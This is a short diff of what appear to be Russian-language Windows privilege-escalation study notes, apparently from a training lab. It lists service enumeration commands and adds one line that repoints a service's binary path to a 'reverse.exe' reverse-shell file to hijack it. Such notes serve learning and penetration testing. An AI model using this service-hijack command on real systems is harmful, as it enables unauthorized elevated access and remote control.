@@ -166,6 +166,8 @@ sc qc daclsvc - используется для получения информ�
 
 sc query daclsvc - информация о состянии службы (старт, стоп)
 
+sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\"" - смена пути к файлу сервиса
+
 # Service binary enumeration
 icacls "C:\xampp\apache\bin\httpd.exe"
 icalcs "C:\xampp\mysql\bin\mysqld.exe"
